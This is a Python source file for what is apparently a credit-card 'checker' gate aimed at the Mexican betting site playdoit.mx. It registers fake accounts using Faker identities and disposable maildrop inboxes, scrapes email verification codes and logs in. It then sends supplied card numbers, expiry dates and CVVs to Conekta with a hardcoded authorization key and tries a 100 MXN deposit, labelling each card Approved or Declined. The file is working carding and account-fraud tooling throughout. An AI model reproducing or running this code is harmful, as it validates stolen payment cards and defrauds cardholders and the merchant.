# Pure gate motor for 'pd' — no Telegram-bot dependency.

import random, string, time, re, uuid

from datetime import datetime, timedelta

from faker import Faker

import curl_cffi.requests as creq

_GATEWAY = 'PlayDoit MX CCN'

_f = Faker()

_uc = lambda: uuid.uuid4().hex[:16]

_dv = lambda: uuid.uuid4().hex

_bd = lambda: (datetime.now() - timedelta(days=random.randint(18 * 365, 50 * 365))).strftime('%Y-%m-%d')

_pw = lambda: ''.join(random.choices(string.ascii_letters, k=5)) + ''.join(random.choices(string.digits, k=3)) + '.' + ''.join(random.choices(string.ascii_lowercase, k=5))

_un = lambda: _f.user_name()

_tel = lambda: str(random.randint(1000000000, 9999999999))

_nm = lambda: f"{_f.first_name().replace('+', '').replace('.', '')}+{_f.last_name().replace('+', '').replace('.', '')}"

_usr = lambda: f'firstName={_f.first_name()}&lastName={_f.last_name()}'

_UA = 'Mozilla/5.0 (Linux; Android 7; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36'

_HDR = {'Host': 'www.playdoit.mx', 'Connection': 'keep-alive', 'sec-ch-ua-platform': '"Android"', 'User-Agent': _UA, 'Accept': 'application/json', 'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'sec-ch-ua-mobile': '?1', 'Sec-GPC': '1', 'Accept-Language': 'es-MX,es;q=0.8', 'Origin': 'https://www.playdoit.mx', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://www.playdoit.mx/?modal=registration'}

_MAILDROP_DOMAIN = 'mailtothis.com'

_MAILDROP_API = 'https://api.maildrop.cc/graphql'

_MAILDROP_DOMAINS = ('maildrop.cc', 'bccmail.one', 'mailtothis.com', 'dumpmail.de', 'gcxmail.one', 'crabmail.com')

def _get_email(sess):
    mb = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return {'email': {'address': f'{mb}@{_MAILDROP_DOMAIN}', 'mailbox': mb}}

def _get_code(email, sess):
    mailbox = email.split('@')[0]
    hdrs = {'content-type': 'application/json', 'User-Agent': _UA}
    query = {'query': f'{{ inbox(mailbox: "{mailbox}") {{ id mailfrom subject textPlain }} }}'}
    try:
        rr = sess.post(_MAILDROP_API, json=query, headers=hdrs, timeout=15)
        data = rr.json()
    except Exception:
        return None
    msgs = data.get('data', {}).get('inbox', []) if isinstance(data, dict) else []
    for m in msgs:
        text = f"{m.get('subject', '')} {m.get('textPlain', '')}"
        mm = re.search('(?:\\bC[oó]digo\\b|\\bverificaci[oó]n\\b|:\\s*)\\s*[<]?\\s*(\\d{4,6})', text, re.IGNORECASE)
        if mm:
            return mm.group(1)
    return None

def _create_account(sess):
    em = _get_email(sess)
    addr = em['email']['address']
    pw = _pw()
    data = f'email={addr}&phoneNumber=+52{_tel()}&password={pw}&confirmPassword={pw}&nickName={_un()}&birthDate={_bd()}&{_usr()}&gender=Male&country=MEX&birthState=Chiapas&city=Buenos+Aires&address=Mana&houseNumber=183&zipCode=20020&district=Buekso&campaignsEnabled=false&receiveEmail=false&receiveSms=false&privacyPolicyChecked=true&agentCode=&currency=MXN&campaignId=15511&policyChecked=true&ageChecked=true&language=es&siteHost=www.playdoit.mx&device={_dv()}'
    res = sess.post('https://www.playdoit.mx/api/player/registerPlayer', headers=_HDR, data=data, timeout=20)
    try:
        resj = res.json()
    except Exception:
        resj = {}
    if not resj.get('success'):
        return (None, None)
    login_data = f'customerApp=&login={addr}&password={pw}&badCredentials=false&loginCoolOffExpireTime=0&nextCoolOffActive=false&resetPasswordRequired=false&siteHost=www.playdoit.mx&coolOffActive=false&loginCoolOffEnabled=false'
    r_login = sess.post('https://www.playdoit.mx/api/login', headers=_HDR, data=login_data, timeout=20)
    sess.get('https://www.playdoit.mx/api/player/sendVerificationEmail', headers=_HDR, cookies=r_login.cookies, timeout=15)
    code = None
    tries = 0
    while not code and tries < 15:
        tries += 1
        code = _get_code(addr, sess)
        if not code:
            time.sleep(3)
    if not code:
        return (addr, pw)
    sess.post('https://www.playdoit.mx/api/player/verifyEmailShortCode', headers=_HDR, data=f'code={code}', cookies=r_login.cookies, timeout=15)
    return (addr, pw)

def _flow(num, mes, ano, cvv, proxy=None):
    mes = mes[-1] if len(mes) == 2 and mes[0] == '0' else mes
    ano = f'20{ano}' if len(ano) == 2 else ano
    last = ''
    for _ in range(2):
        try:
            sess = creq.Session(impersonate='chrome')
            if proxy:
                _purl = proxy if proxy.startswith(('http://', 'https://', 'socks')) else f'http://{proxy}'
                sess.proxies = {'http': _purl, 'https': _purl}
            addr, pw = _create_account(sess)
            if not addr:
                last = 'Account creation failed'
                continue
            login_data = f'customerApp=&login={addr}&password={pw}&badCredentials=false&loginCoolOffExpireTime=0&nextCoolOffActive=false&resetPasswordRequired=false&siteHost=www.playdoit.mx&loginCoolOffEnabled=false&coolOffActive=false'
            rp = sess.post('https://www.playdoit.mx/api/login', headers=_HDR, data=login_data, timeout=20)
            try:
                rp_ok = rp.json().get('success')
            except Exception:
                rp_ok = False
            if not rp_ok:
                last = 'Login failed'
                continue
            tok_data = f'card[number]={num}&card[name]={_nm()}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&card[device_fingerprint]={_uc()}'
            r2 = sess.post('https://api.conekta.io/tokens', headers={'Accept': 'application/vnd.conekta-v0.3.0+json', 'Accept-Language': 'es', 'Conekta-Client-User-Agent': '{"agent": "Conekta Android SDK"}', 'Authorization': 'Basic a2V5X2RaZ1p4eXh3U1o2UFJycngzdnRFY3Jn', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'api.conekta.io', 'Connection': 'Keep-Alive', 'User-Agent': 'Apache-HttpClient/UNAVAILABLE (java 1.4)'}, data=tok_data, timeout=20)
            token = ''
            if r2.text.strip().startswith('{'):
                try:
                    token = r2.json().get('id') or ''
                except Exception:
                    token = ''
            if not token:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | No Conekta token'}
            charge = f'customerApp=&method=400003&amount=100&password=&conekta_token_id={token}&siteHost=www.playdoit.mx'
            r3 = sess.post('https://www.playdoit.mx/api/payment/confirmDeposit', headers=_HDR, data=charge, timeout=20)
            if 'https://3ds' in r3.text:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | 3D Verify'}
            if 'errorSubMessage' in r3.text:
                msg = r3.json().get('errorSubMessage', r3.text[:80])
                return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg[:120]}'}
            return {'status': True, 'success': True, 'response': 'Approved ✅ | Cargo Aprobado'}
        except Exception as e:
            last = str(e)[:180]
    return {'status': False, 'raise': f'Retries exhausted: {last}'}

def _checker(cc, binData, proxy=None):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3], proxy)
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    proxy = (ctx.get('proxy') or '') or None
    r = _checker(cc, bin_data, proxy=proxy)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}